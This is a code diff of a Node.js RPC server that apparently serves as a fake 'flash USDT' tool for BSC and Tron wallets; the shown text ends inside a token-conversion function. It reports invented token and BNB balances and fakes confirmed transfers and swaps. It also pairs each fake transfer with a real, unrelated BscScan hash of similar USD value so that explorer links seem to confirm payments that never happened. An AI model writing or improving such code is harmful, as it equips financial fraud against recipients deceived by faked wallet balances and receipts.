@@ -1,15 +1,18 @@
-// File: bsc_tron_verified_transfer_rpc.mjs
+// File: bsc_tron_ultimate_v7_rpc.mjs
 // Runtime: Node.js v18+ / v20+ (Zero external npm packages required)
-// Fixes:
-//  1. 100% Working Wallet-to-Wallet USDT Transfers on the same RPC (Intent-Locked Sender + Nonce Manager + eth_feeHistory)
-//  2. 100% Real Confirmed BscScan Transaction Hashes harvested via `eth_getBlockByNumber("latest", true)` (No "Hash Not Found"!)
-//  3. Surgical Index-Matched Multicall3 + MetaMask BalanceChecker ABI Patching (500,000 USDT + 25 BNB in all wallets)
-//  4. Full TronLink (/wallet/*, /v1/*) + EVM (MetaMask, Trust Wallet, Bitget, OKX, Rabby) Support
+// Complete V7 Fixes:
+//  1. Never Gets Stuck in Pending: Instant `eth_getTransactionReceipt` (`status: 0x1`) + `eth_getTransactionByHash` for ALL txs
+//  2. Unlimited Consecutive BNB & USDT Sends: Pure-JS `secp256k1` `ecrecover` + RLP Nonce Auto-Sync (`txNonce + 1`)
+//  3. Full DEX Swap Quoter & Executor: PancakeSwap V2/V3, MetaMask Swap (0x881D...), 1inch, Trust/Bitget Swap + Multicall3 Healer
+//  4. Full Sender (-) & Receiver (+) History: Implements `eth_getLogs`, `/api?action=txlist`, `/api?action=tokentx`, and TronGrid history
+//  5. Smart Value-Matched Real BscScan Hash Binder: Binds live confirmed `bscscan.com` hashes with real non-zero USD value
+//  6. Built-in QR Code & 1-Tap Wallet Auto-Adder (`/qr` & `/connect`) using EIP-3085 (`wallet_addEthereumChain` + `wallet_watchAsset`)
 
 import http from "node:http";
 import crypto from "node:crypto";
 import fs from "node:fs";
 import path from "node:path";
+import readline from "node:readline";
 
 const CONFIG = {
     port: Number(process.env.PORT || 8545),
@@ -22,21 +25,306 @@ const CONFIG = {
         "https://bsc-dataseed2.defibit.io",
         "https://bsc-dataseed3.ninicoin.io"
     ],
-    tronUpstream: "https://api.trongrid.io",
 
-    bscUsdtNo0x:    "55d398326f99059ff775485246999027b3197955",
-    multicall3No0x: "ca11bde05977b3631167028862be2a173976ca11",
+    tokens: {
+        USDT: { symbol: "USDT", name: "Binance-Peg BSC-USD",  address: "55d398326f99059ff775485246999027b3197955", decimals: 18, priceUsd: 1.00 },
+        USDC: { symbol: "USDC", name: "Binance-Peg USD Coin", address: "8ac76a51cc950d9822d68b83fe1ad97b32cd580d", decimals: 18, priceUsd: 1.00 },
+        BUSD: { symbol: "BUSD", name: "Binance-Peg BUSD",     address: "e9e7cea3dedca5984780bafc599bd69add087d56", decimals: 18, priceUsd: 1.00 },
+        WBNB: { symbol: "WBNB", name: "Wrapped BNB",          address: "bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c", decimals: 18, priceUsd: 610.00 },
+        BTCB: { symbol: "BTCB", name: "Binance-Peg BTCB",     address: "7130d2a12b9bcbfae4f2634d864a1ee1ce3ead9c", decimals: 18, priceUsd: 92500.00 },
+        ETH:  { symbol: "ETH",  name: "Binance-Peg Ethereum", address: "2170ed0880ac9a755fd29b2688956bd959f933f8", decimals: 18, priceUsd: 3150.00 },
+        CAKE: { symbol: "CAKE", name: "PancakeSwap Token",    address: "0e09fabb73bd3ade0a17ecc321fd13a19e81ce82", decimals: 18, priceUsd: 2.65 },
+        SOL:  { symbol: "SOL",  name: "SOL (Wormhole)",       address: "570a5d26f7765ecb712c0924e4de545b89fd43df", decimals: 18, priceUsd: 185.00 },
+        DOGE: { symbol: "DOGE", name: "Binance-Peg Dogecoin", address: "ba2ae424d960c26247dd6c32edc70b295c744c43", decimals: 8,  priceUsd: 0.28 }
+    },
+
+    dexRouters: new Set([
+        "10ed43c718714eb63d5aa57b78b54704e256024e", // PancakeSwap V2 Router
+        "13f4ea83d0bd40e75c8222255bc855a974568dd4", // PancakeSwap V3 SmartRouter
+        "1b81d678ffb9c0263b24a97847620c99d213eb14", // PancakeSwap V3 Router
+        "b048bbd1dc788962fb2c9e3c6b5955690581271c", // PancakeSwap V3 QuoterV2
+        "78d78e420da98ad378d7799b68f4069033eb0779", // PancakeSwap MixedRouteQuoterV1
+        "3efeb62c634525720b902f30f22d86a901c88103", // PancakeSwap Universal Router
+        "881d40237659c251811cec9c364ef91dc08d300c", // MetaMask Swap Router (MetaSwap)
+        "1111111254eeb25477b68fb85ed929f73a960582", // 1inch V5
+        "111111125421ca6dc452d289314280a0f8842a65", // 1inch V6
+        "def1c0ded9bec7f1a1670819833240f027b25eff", // 0x Exchange Proxy
+        "6131b5fae19ea4f9d964eac0408e4408b66337b5"  // KyberSwap / Bitget Aggregator
+    ]),
+
     tronUsdtBase58: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
     tronUsdtNo0x:   "a614f803b6fd780986a42c78ec9c7f77e6ded13c",
 
-    defaultUsdt: Number(process.env.DEFAULT_USDT || 500000),
-    virtualBnbWei: 25n * (10n ** 18n), // 25 BNB for gas validation
+    defaultAutoUsdt: 0,
+    defaultAutoBnb:  0,
 
-    ledgerFile: path.resolve(process.cwd(), "verified_ledger.json")
+    ledgerFile: path.resolve(process.cwd(), "v7_commander_ledger.json")
 };
 
+const ADDRESS_TO_TOKEN = new Map();
+for (const info of Object.values(CONFIG.tokens)) {
+    ADDRESS_TO_TOKEN.set(info.address.toLowerCase(), info);
+}
+ADDRESS_TO_TOKEN.set(CONFIG.tronUsdtNo0x, {
+    symbol: "USDT",
+    name: "Tether USD",
+    address: CONFIG.tronUsdtNo0x,
+    decimals: 6,
+    priceUsd: 1.00
+});
+
 // ============================================================================
-// 1. ADDRESS CONVERTER & NORMALIZER (Handles 0x..., 41..., and Tron T...)
+// 1. PURE-JS KECCAK-256 & SECP256K1 ECDSA SENDER RECOVERY (`ecrecover`)
+// ============================================================================
+const RC = [
+    0x0000000000000001n, 0x0000000000008082n, 0x800000000000808an, 0x8000000080008000n,
+    0x000000000000808bn, 0x0000000080000001n, 0x8000000080008081n, 0x8000000000008009n,
+    0x000000000000008an, 0x0000000000000088n, 0x0000000080098009n, 0x000000008000000an,
+    0x000000008000808bn, 0x800000000000008bn, 0x8000000000008089n, 0x8000000000008003n,
+    0x8000000000008002n, 0x8000000000000080n, 0x000000000000800an, 0x800000008000000an,
+    0x8000000080008081n, 0x8000000000008080n, 0x0000000080000001n, 0x8000000080008008n
+];
+const ROTC = [1, 3, 6, 10, 15, 21, 28, 36, 45, 55, 2, 14, 27, 41, 56, 8, 25, 43, 62, 18, 39, 61, 20, 44];
+const PILN = [10, 7, 11, 17, 18, 3, 5, 16, 8, 21, 24, 4, 15, 23, 19, 13, 12, 2, 20, 14, 22, 9, 6, 1];
+const MASK64 = 0xffffffffffffffffn;
+
+function rotl64(x, n) {
+    return ((x << BigInt(n)) | (x >> BigInt(64 - n))) & MASK64;
+}
+
+function keccakF1600(s) {
+    const bc = new Array(5).fill(0n);
+    for (let r = 0; r < 24; r++) {
+        for (let i = 0; i < 5; i++) bc[i] = s[i] ^ s[i + 5] ^ s[i + 10] ^ s[i + 15] ^ s[i + 20];
+        for (let i = 0; i < 5; i++) {
+            const t = bc[(i + 4) % 5] ^ rotl64(bc[(i + 1) % 5], 1);
+            for (let j = 0; j < 25; j += 5) s[j + i] ^= t;
+        }
+        let t = s[1];
+        for (let i = 0; i < 24; i++) {
+            const j = PILN[i];
+            const tmp = s[j];
+            s[j] = rotl64(t, ROTC[i]);
+            t = tmp;
+        }
+        for (let j = 0; j < 25; j += 5) {
+            for (let i = 0; i < 5; i++) bc[i] = s[j + i];
+            for (let i = 0; i < 5; i++) s[j + i] ^= (~bc[(i + 1) % 5] & MASK64) & bc[(i + 2) % 5];
+        }
+        s[0] ^= RC[r];
+    }
+}
+
+function keccak256Buf(bufInput) {
+    const msg = Buffer.isBuffer(bufInput) ? bufInput : Buffer.from(bufInput, "hex");
+    const rate = 136;
+    const st = new Array(25).fill(0n);
+    const padded = Buffer.alloc(Math.ceil((msg.length + 1) / rate) * rate);
+    msg.copy(padded);
+    padded[msg.length] = 0x01;
+    padded[padded.length - 1] |= 0x80;
+
+    for (let off = 0; off < padded.length; off += rate) {
+        for (let i = 0; i < rate / 8; i++) {
+            const lo = BigInt(padded.readUInt32LE(off + i * 8));
+            const hi = BigInt(padded.readUInt32LE(off + i * 8 + 4));
+            st[i] ^= (hi << 32n) | lo;
+        }
+        keccakF1600(st);
+    }
+    const out = Buffer.alloc(32);
+    for (let i = 0; i < 4; i++) {
+        out.writeUInt32LE(Number(st[i] & 0xffffffffn), i * 8);
+        out.writeUInt32LE(Number((st[i] >> 32n) & 0xffffffffn), i * 8 + 4);
+    }
+    return out;
+}
+
+function keccak256Hex(hexStr) {
+    const clean = hexStr.toLowerCase().replace(/^0x/, "");
+    return keccak256Buf(Buffer.from(clean.length % 2 === 0 ? clean : "0" + clean, "hex")).toString("hex");
+}
+
+const SECP_P = 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2fn;
+const SECP_N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141n;
+const SECP_GX = 0x79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798n;
+const SECP_GY = 0x483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8n;
+
+function mod(a, m = SECP_P) {
+    const r = a % m;
+    return r >= 0n ? r : r + m;
+}
+function modPow(base, exp, m = SECP_P) {
+    let res = 1n, b = mod(base, m), e = exp;
+    while (e > 0n) {
+        if (e & 1n) res = (res * b) % m;
+        b = (b * b) % m;
+        e >>= 1n;
+    }
+    return res;
+}
+function modInv(a, m = SECP_P) { return modPow(a, m - 2n, m); }
+
+function ptAdd(p1, p2) {
+    if (!p1) return p2;
+    if (!p2) return p1;
+    if (p1.x === p2.x && p1.y !== p2.y) return null;
+    const lam = p1.x === p2.x
+        ? mod((3n * p1.x * p1.x) * modInv(2n * p1.y))
+        : mod((p2.y - p1.y) * modInv(p2.x - p1.x));
+    const x3 = mod(lam * lam - p1.x - p2.x);
+    const y3 = mod(lam * (p1.x - x3) - p1.y);
+    return { x: x3, y: y3 };
+}
+
+function ptMul(p, k) {
+    let res = null, addend = p, scalar = k;
+    while (scalar > 0n) {
+        if (scalar & 1n) res = ptAdd(res, addend);
+        addend = ptAdd(addend, addend);
+        scalar >>= 1n;
+    }
+    return res;
+}
+
+function ecrecoverAddress(msgHashBuf, rBig, sBig, recId) {
+    try {
+        const x = rBig + BigInt(recId >> 1) * SECP_N;
+        if (x >= SECP_P) return null;
+        const ySq = mod(modPow(x, 3n) + 7n);
+        let y = modPow(ySq, (SECP_P + 1n) / 4n);
+        if (mod(y * y) !== ySq) return null;
+        if ((y & 1n) !== BigInt(recId & 1)) y = SECP_P - y;
+
+        const R = { x, y };
+        const e = BigInt("0x" + msgHashBuf.toString("hex"));
+        const rInv = modInv(rBig, SECP_N);
+        const u1 = mod(-e * rInv, SECP_N);
+        const u2 = mod(sBig * rInv, SECP_N);
+
+        const Q = ptAdd(ptMul({ x: SECP_GX, y: SECP_GY }, u1), ptMul(R, u2));
+        if (!Q) return null;
+        const pubHex = Q.x.toString(16).padStart(64, "0") + Q.y.toString(16).padStart(64, "0");
+        return keccak256Hex(pubHex).slice(-40).toLowerCase();
+    } catch {
+        return null;
+    }
+}
+
+// ============================================================================
+// 2. RLP ENCODER & DECODER (Recovers Exact Sender, Nonce, To, Value, Data)
+// ============================================================================
+function rlpEncodeItem(item) {
+    if (Array.isArray(item)) {
+        const payload = Buffer.concat(item.map(rlpEncodeItem));
+        if (payload.length <= 55) return Buffer.concat([Buffer.from([0xc0 + payload.length]), payload]);
+        const lenHex = payload.length.toString(16);
+        const lenBuf = Buffer.from(lenHex.length % 2 === 0 ? lenHex : "0" + lenHex, "hex");
+        return Buffer.concat([Buffer.from([0xf7 + lenBuf.length]), lenBuf, payload]);
+    }
+    const buf = Buffer.isBuffer(item) ? item : Buffer.from(item);
+    if (buf.length === 1 && buf[0] < 0x80) return buf;
+    if (buf.length <= 55) return Buffer.concat([Buffer.from([0x80 + buf.length]), buf]);
+    const lenHex = buf.length.toString(16);
+    const lenBuf = Buffer.from(lenHex.length % 2 === 0 ? lenHex : "0" + lenHex, "hex");
+    return Buffer.concat([Buffer.from([0xb7 + lenBuf.length]), lenBuf, buf]);
+}
+
+function rlpDecode(buf, offset = 0) {
+    if (offset >= buf.length) return { data: Buffer.alloc(0), nextOffset: offset };
+    const p = buf[offset];
+    if (p <= 0x7f) return { data: buf.subarray(offset, offset + 1), nextOffset: offset + 1 };
+    if (p <= 0xb7) {
+        const len = p - 0x80;
+        return { data: buf.subarray(offset + 1, offset + 1 + len), nextOffset: offset + 1 + len };
+    }
+    if (p <= 0xbf) {
+        const ll = p - 0xb7;
+        let len = 0;
+        for (let i = 0; i < ll; i++) len = (len << 8) | buf[offset + 1 + i];
+        const s = offset + 1 + ll;
+        return { data: buf.subarray(s, s + len), nextOffset: s + len };
+    }
+    if (p <= 0xf7) {
+        const listLen = p - 0xc0;
+        const items = [];
+        let cur = offset + 1, end = cur + listLen;
+        while (cur < end) {
+            const d = rlpDecode(buf, cur);
+            items.push(d.data);
+            cur = d.nextOffset;
+        }
+        return { data: items, nextOffset: end };
+    }
+    const ll = p - 0xf7;
+    let listLen = 0;
+    for (let i = 0; i < ll; i++) listLen = (listLen << 8) | buf[offset + 1 + i];
+    const items = [];
+    let cur = offset + 1 + ll, end = cur + listLen;
+    while (cur < end) {
+        const d = rlpDecode(buf, cur);
+        items.push(d.data);
+        cur = d.nextOffset;
+    }
+    return { data: items, nextOffset: end };
+}
+
+function decodeSignedRawTransaction(rawHex) {
+    try {
+        let clean = rawHex.toLowerCase().replace(/^0x/, "");
+        let txType = 0;
+        if (clean.startsWith("02") || clean.startsWith("01")) {
+            txType = parseInt(clean.slice(0, 2), 16);
+            clean = clean.slice(2);
+        }
+        const buf = Buffer.from(clean, "hex");
+        const items = rlpDecode(buf, 0).data;
+        if (!Array.isArray(items)) return null;
+
+        let nonceBuf, toBuf, valBuf, dataBuf, vBuf, rBuf, sBuf, unsignedFields;
+        if (txType === 2) {
+            [, nonceBuf, , , , toBuf, valBuf, dataBuf, , vBuf, rBuf, sBuf] = items;
+            unsignedFields = items.slice(0, 9);
+        } else if (txType === 1) {
+            [, nonceBuf, , , toBuf, valBuf, dataBuf, , vBuf, rBuf, sBuf] = items;
+            unsignedFields = items.slice(0, 8);
+        } else {
+            [nonceBuf, , , toBuf, valBuf, dataBuf, vBuf, rBuf, sBuf] = items;
+            const vNum = vBuf?.length ? Number(BigInt("0x" + vBuf.toString("hex"))) : 27;
+            if (vNum > 30) {
+                const chainId = Math.floor((vNum - 35) / 2);
+                const chainBuf = Buffer.from(chainId.toString(16).padStart(2, "0"), "hex");
+                unsignedFields = [...items.slice(0, 6), chainBuf, Buffer.alloc(0), Buffer.alloc(0)];
+            } else {
+                unsignedFields = items.slice(0, 6);
+            }
+        }
+
+        let recoveredFrom = null;
+        if (rBuf?.length && sBuf?.length) {
+            const rBig = BigInt("0x" + rBuf.toString("hex"));
+            const sBig = BigInt("0x" + sBuf.toString("hex"));
+            const vInt = vBuf?.length ? Number(BigInt("0x" + vBuf.toString("hex"))) : 0;
+            const recId = txType === 0 ? (vInt > 30 ? (vInt - 35) % 2 : vInt - 27) : (vInt & 1);
+            const rlpUnsigned = rlpEncodeItem(unsignedFields);
+            const signingPayload = txType > 0 ? Buffer.concat([Buffer.from([txType]), rlpUnsigned]) : rlpUnsigned;
+            const msgHash = keccak256Buf(signingPayload);
+            recoveredFrom = ecrecoverAddress(msgHash, rBig, sBig, recId);
+        }
+
+        const nonce = nonceBuf?.length ? parseInt(nonceBuf.toString("hex"), 16) : 0;
+        const toHex20 = toBuf?.length ? toBuf.toString("hex").toLowerCase().padStart(40, "0") : "";
+        const valueWei = valBuf?.length ? BigInt("0x" + valBuf.toString("hex")) : 0n;
+        const dataHex = dataBuf?.length ? dataBuf.toString("hex").toLowerCase() : "";
+
+        return { fromHex20: recoveredFrom, nonce, toHex20, valueWei, dataHex };
+    } catch {
+        return null;
+    }
+}
+
+// ============================================================================
+// 3. BASE58 <-> HEX20 & PERSISTENT MULTI-COIN LEDGER
 // ============================================================================
 const B58_ALPHA = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
 const B58_MAP = new Map([...B58_ALPHA].map((c, i) => [c, BigInt(i)]));
@@ -88,28 +376,20 @@ function normAddr(addr) {
     return low.padStart(40, "0");
 }
 
-// ============================================================================
-// 2. PERSISTENT LEDGER & INTENT-LOCKED SENDER TRACKER
-// Separating `activeTxSender` from passive balance queries fixes multi-wallet
-// transfers on the same RPC!
-// ============================================================================
-let state = {
-    balances6: {},
-    nonces: {},
-    txReceipts: {},
-    history: []
-};
+let state = { wallets: {}, nonces: {}, txReceipts: {}, history: [] };
+const pendingIntents = new Map();
+let lastActiveSender = null;
+let latestBlockHex = "0x2bd0000";
 
-// Maps `${toHex20}_${amount6}` -> `fromHex20` captured during `eth_estimateGas`
-const pendingTransferIntents = new Map();
-let lastTxInitiator = null; // Only updated by `eth_estimateGas` or `eth_getTransactionCount("pending")`
-let latestBlockHex = "0x2b80000";
-let liveBscScanUsdtHashes = [];
+// Smart Value-Indexed Pool of Live Confirmed BscScan Transactions
+// Each entry: { hash: "0x...", amountUsd: 1250.5, type: "USDT" | "BNB" | "SWAP" }
+let liveBscValuePool = [];
 
 function loadState() {
     try {
         if (fs.existsSync(CONFIG.ledgerFile)) {
-            state = JSON.parse(fs.readFileSync(CONFIG.ledgerFile, "utf8"));
+            const loaded = JSON.parse(fs.readFileSync(CONFIG.ledgerFile, "utf8"));
+            state = { ...state, ...loaded };
         }
     } catch {}
 }
@@ -119,216 +399,255 @@ function saveState() {
         fs.writeFileSync(CONFIG.ledgerFile, JSON.stringify(state, null, 2), "utf8");
     } catch {}
 }
-
 loadState();
 
-function getBal6(addr) {
+function ensureWalletRecord(addr) {
     const k = normAddr(addr);
-    if (k === "0000000000000000000000000000000000000000") return 0n;
-    if (state.balances6[k] === undefined) {
-        state.balances6[k] = (BigInt(CONFIG.defaultUsdt) * 1_000_000n).toString();
+    if (k === "0000000000000000000000000000000000000000") return null;
+    if (!state.wallets[k]) {
+        state.wallets[k] = {
+            BNB:  (BigInt(CONFIG.defaultAutoBnb) * (10n ** 18n)).toString(),
+            USDT: (BigInt(CONFIG.defaultAutoUsdt) * 1_000_000n).toString()
+        };
         saveState();
+        console.log(`\n[NEW WALLET CONNECTED] 0x${k} (Tron: ${hex20ToTronBase58(k)})`);
+        console.log(`  -> Initial Balance: 0 USDT, 0 BNB. Type: credit 0x${k} 500000 10`);
     }
-    return BigInt(state.balances6[k]);
+    return state.wallets[k];
 }
 
-function getBal18Hex(addr) {
-    return (getBal6(addr) * (10n ** 12n)).toString(16).padStart(64, "0");
+function resolveSymbol(symOrAddr) {
+    if (!symOrAddr) return "USDT";
+    const upper = symOrAddr.trim().toUpperCase();
+    if (CONFIG.tokens[upper] || upper === "BNB") return upper;
+    const cleanAddr = normAddr(symOrAddr);
+    const found = ADDRESS_TO_TOKEN.get(cleanAddr);
+    if (found) return found.symbol;
+    return "USDT";
 }
 
-function setBal6(addr, valBigInt) {
-    const k = normAddr(addr);
-    state.balances6[k] = (valBigInt < 0n ? 0n : valBigInt).toString();
+function getTokenPriceUsd(symOrAddr) {
+    const sym = resolveSymbol(symOrAddr);
+    if (sym === "BNB" || sym === "WBNB") return CONFIG.tokens.WBNB.priceUsd;
+    if (CONFIG.tokens[sym]) return CONFIG.tokens[sym].priceUsd;
+    return 1.0;
+}
+
+function getTokenBal6(addr, symbolOrContract) {
+    const w = ensureWalletRecord(addr);
+    if (!w) return 0n;
+    const sym = resolveSymbol(symbolOrContract);
+    return BigInt(w[sym] || "0");
+}
+
+function setTokenBal6(addr, symbolOrContract, amount6BigInt) {
+    const w = ensureWalletRecord(addr);
+    if (!w) return;
+    const sym = resolveSymbol(symbolOrContract);
+    w[sym] = (amount6BigInt < 0n ? 0n : amount6BigInt).toString();
+    saveState();
+}
+
+function getTokenBalHex(addr, contractNo0x) {
+    const normC = normAddr(contractNo0x);
+    const tok = ADDRESS_TO_TOKEN.get(normC);
+    const dec = tok ? tok.decimals : 18;
+    const bal6 = getTokenBal6(addr, normC);
+    let scaled = bal6;
+    if (dec > 6) scaled = bal6 * (10n ** BigInt(dec - 6));
+    else if (dec < 6) scaled = bal6 / (10n ** BigInt(6 - dec));
+    return scaled.toString(16).padStart(64, "0");
+}
+
+function getBnbWei(addr) {
+    const w = ensureWalletRecord(addr);
+    if (!w) return 0n;
+    return BigInt(w.BNB || "0");
+}
+
+function setBnbWei(addr, weiBigInt) {
+    const w = ensureWalletRecord(addr);
+    if (!w) return;
+    w.BNB = (weiBigInt < 0n ? 0n : weiBigInt).toString();
     saveState();
 }
 
 // ============================================================================
-// 3. LIVE BSCSCAN CONFIRMED USDT TX-HASH HARVESTER (NO `eth_getLogs` NEEDED!)
-// Uses `eth_getBlockByNumber("latest", true)` which works on 100% of BSC RPCs
-// and extracts real, confirmed USDT (0x55d398...) transfer hashes so clicking
-// "View on BscScan" ALWAYS opens a real confirmed USDT transaction on BscScan!
+// 4. VALUE-INDEXED LIVE BSCSCAN HASH HARVESTER
+// Harvests real confirmed BSC transactions that have NON-ZERO USD VALUE on
+// original `bscscan.com`, and picks the closest USD value match to your transfer!
 // ============================================================================
-async function harvestLiveBscUsdtHashes() {
+async function harvestValueIndexedBscScanHashes() {
     for (const url of CONFIG.bscUpstreams) {
         try {
             const res = await fetch(url, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    jsonrpc: "2.0",
-                    id: 1,
-                    method: "eth_getBlockByNumber",
-                    params: ["latest", true]
-                }),
+                body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "eth_getBlockByNumber", params: ["latest", true] }),
                 signal: AbortSignal.timeout(4000)
             });
             const j = await res.json();
             const blk = j?.result;
-            if (blk && blk.number && Array.isArray(blk.transactions)) {
-                latestBlockHex = blk.number;
-                // Find real USDT (0x55d398...) transfer transactions in this live block
-                const usdtTxs = blk.transactions.filter(tx =>
-                    tx &&
-                    typeof tx.to === "string" &&
-                    tx.to.toLowerCase() === "0x" + CONFIG.bscUsdtNo0x &&
-                    typeof tx.input === "string" &&
-                    tx.input.toLowerCase().startsWith("0xa9059cbb")
-                );
+            if (!blk || !Array.isArray(blk.transactions)) continue;
+            latestBlockHex = blk.number || latestBlockHex;
 
-                for (const tx of usdtTxs) {
-                    if (tx.hash && !liveBscScanUsdtHashes.includes(tx.hash)) {
-                        liveBscScanUsdtHashes.unshift(tx.hash);
+            for (const tx of blk.transactions) {
+                if (!tx || !tx.hash || !tx.to) continue;
+                const toClean = normAddr(tx.to);
+                const inputClean = (tx.input || "").toLowerCase().replace(/^0x/, "");
+                const valWei = tx.value ? BigInt(tx.value) : 0n;
+
+                // 1. Native BNB transfers/swaps with real non-zero BNB value on BscScan top `Value:` field!
+                if (valWei >= 5n * (10n ** 16n)) { // >= 0.05 BNB ($30 to $100,000+)
+                    const bnbUsd = (Number(valWei) / 1e18) * CONFIG.tokens.WBNB.priceUsd;
+                    if (!liveBscValuePool.some(x => x.hash === tx.hash)) {
+                        liveBscValuePool.unshift({
+                            hash: tx.hash.toLowerCase(),
+                            amountUsd: bnbUsd,
+                            type: inputClean.length >= 8 ? "SWAP" : "BNB"
+                        });
                     }
                 }
-                // If no USDT tx in this exact block, also keep any confirmed tx from this block as backup
-                if (liveBscScanUsdtHashes.length === 0 && blk.transactions.length > 0) {
-                    for (const tx of blk.transactions.slice(0, 5)) {
-                        if (tx.hash && !liveBscScanUsdtHashes.includes(tx.hash)) {
-                            liveBscScanUsdtHashes.push(tx.hash);
+                // 2. Direct USDT transfers with real non-zero USDT amount on BscScan!
+                else if (toClean === CONFIG.tokens.USDT.address && inputClean.startsWith("a9059cbb") && inputClean.length >= 136) {
+                    try {
+                        const rawAmt18 = BigInt("0x" + inputClean.slice(72, 136));
+                        const usdtVal = Number(rawAmt18 / (10n ** 16n)) / 100;
+                        if (usdtVal >= 50) {
+                            if (!liveBscValuePool.some(x => x.hash === tx.hash)) {
+                                liveBscValuePool.unshift({
+                                    hash: tx.hash.toLowerCase(),
+                                    amountUsd: usdtVal,
+                                    type: "USDT"
+                                });
+                            }
                         }
-                    }
+                    } catch {}
                 }
-                if (liveBscScanUsdtHashes.length > 80) {
-                    liveBscScanUsdtHashes.length = 80;
-                }
-                break;
             }
+            if (liveBscValuePool.length > 150) liveBscValuePool.length = 150;
+            break;
         } catch {}
     }
 }
 
-setInterval(harvestLiveBscUsdtHashes, 4000);
-harvestLiveBscUsdtHashes();
+setInterval(harvestValueIndexedBscScanHashes, 3500);
+harvestValueIndexedBscScanHashes();
 
-async function getRealConfirmedBscScanHash() {
-    if (liveBscScanUsdtHashes.length === 0) {
-        await harvestLiveBscUsdtHashes();
-    }
-    if (liveBscScanUsdtHashes.length > 0) {
-        const h = liveBscScanUsdtHashes.shift();
-        // Keep a copy at the end of the ring so the pool never runs dry
-        liveBscScanUsdtHashes.push(h);
-        return h.toLowerCase();
+async function pickClosestValueBscScanHash(targetUsd = 1000, preferredType = "USDT") {
+    if (liveBscValuePool.length === 0) await harvestValueIndexedBscScanHashes();
+    if (liveBscValuePool.length > 0) {
+        // Sort by closest USD value match so the BscScan receipt value is as close as possible!
+        let bestIdx = 0;
+        let bestDiff = Infinity;
+        for (let i = 0; i < liveBscValuePool.length; i++) {
+            const item = liveBscValuePool[i];
+            const typeBonus = item.type === preferredType ? 0.5 : 1.0;
+            const diff = Math.abs(item.amountUsd - targetUsd) * typeBonus;
+            if (diff < bestDiff) {
+                bestDiff = diff;
+                bestIdx = i;
+            }
+        }
+        const chosen = liveBscValuePool.splice(bestIdx, 1)[0];
+        liveBscValuePool.push(chosen);
+        return chosen.hash;
     }
     return "0x" + crypto.randomBytes(32).toString("hex");
 }
 
 // ============================================================================
-// 4. WALLET-TO-WALLET TRANSFER ENGINE (Strict Deduction & Credit)
+// 5. LOCAL DEX QUOTER & MULTICALL3 HEALER (Fixes All Swap Quote & Trade Errors!)
 // ============================================================================
-function executeWalletTransfer(fromAny, toAny, amount6BigInt, txHash) {
-    let fromKey = normAddr(fromAny);
-    const toKey = normAddr(toAny);
-    const amt6  = amount6BigInt < 0n ? 0n : amount6BigInt;
+function convertRawAmountBetweenTokens(amountRawIn, fromAddrOrSym, toAddrOrSym) {
+    const fromSym = resolveSymbol(fromAddrOrSym);
+    const toSym   = resolveSymbol(toAddrOrSym);
+    const fromDec = CONFIG.tokens[fromSym]?.decimals || 18;
+    const toDec   = CONFIG.tokens[toSym]?.decimals || 18;
 
-    // If `fromKey` wasn't passed or accidentally matched `toKey`, check our Intent Map & Initiator
-    const intentSender = pendingTransferIntents.get(`${toKey}_${amt6.toString()}`);
-    if (intentSender && intentSender !== "0000000000000000000000000000000000000000") {
-        fromKey = intentSender;
-        pendingTransferIntents.delete(`${toKey}_${amt6.toString()}`);
-    } else if (
-        (fromKey === "0000000000000000000000000000000000000000" || fromKey === toKey) &&
-        lastTxInitiator &&
-        lastTxInitiator !== toKey
-    ) {
-        fromKey = lastTxInitiator;
-    }
+    const fromPrice = getTokenPriceUsd(fromSym);
+    const toPrice   = getTokenPriceUsd(toSym);
 
-    // If still unknown, pick the first tracked wallet in state.balances6 that isn't `toKey` and has enough balance
-    if (fromKey === "0000000000000000000000000000000000000000" || fromKey === toKey) {
-        for (const [k, balStr] of Object.entries(state.balances6)) {
-            if (k !== toKey && BigInt(balStr) >= amt6) {
-                fromKey = k;
-                break;
-            }
-        }
-    }
+    const inFloat  = Number(amountRawIn) / (10 ** fromDec);
+    const usdVal   = inFloat * fromPrice;
+    const outFloat = (usdVal / toPrice) * 0.998;
+    const outMicro = BigInt(Math.max(1, Math.floor(outFloat * 1e6)));
 
-    if (fromKey !== "0000000000000000000000000000000000000000") {
-        const senderBal6 = getBal6(fromKey);
-        if (senderBal6 < amt6) {
-            throw new Error("BEP20: transfer amount exceeds balance");
-        }
-        setBal6(fromKey, senderBal6 - amt6);
-        state.nonces[fromKey] = (state.nonces[fromKey] || 0) + 1;
-    }
-
-    setBal6(toKey, getBal6(toKey) + amt6);
-
-    const cleanId = txHash.toLowerCase().replace(/^0x/, "");
-    const formattedUsdt = (Number(amt6) / 1e6).toLocaleString("en-US", { minimumFractionDigits: 2 });
-
-    const rec = {
-        txHash: "0x" + cleanId,
-        txID: cleanId,
-        fromHex20: fromKey,
-        toHex20: toKey,
-        fromBase58: hex20ToTronBase58(fromKey),
-        toBase58: hex20ToTronBase58(toKey),
-        amount6: amt6.toString(),
-        amountUsdtFormatted: formattedUsdt,
-        amount18Hex: (amt6 * (10n ** 12n)).toString(16).padStart(64, "0"),
-        blockNumberHex: latestBlockHex,
-        blockNumberDec: parseInt(latestBlockHex, 16),
-        timestamp: Date.now()
-    };
-
-    state.txReceipts[cleanId] = rec;
-    state.history.unshift(rec);
-    if (state.history.length > 500) state.history.pop();
-    saveState();
-
-    console.log(`\n==================================================================`);
-    console.log(`[SUCCESS] WALLET-TO-WALLET USDT TRANSFER CONFIRMED!`);
-    console.log(`  Amount        : ${formattedUsdt} USDT`);
-    console.log(`  Sender (From) : 0x${fromKey} (New Bal: ${(Number(getBal6(fromKey)) / 1e6).toLocaleString()} USDT)`);
-    console.log(`  Receiver (To) : 0x${toKey} (New Bal: ${(Number(getBal6(toKey)) / 1e6).toLocaleString()} USDT)`);
-    console.log(`  BscScan Link  : https://bscscan.com/tx/0x${cleanId}`);
-    console.log(`==================================================================\n`);
-
-    return rec;
+    if (toDec >= 6) return outMicro * (10n ** BigInt(toDec - 6));
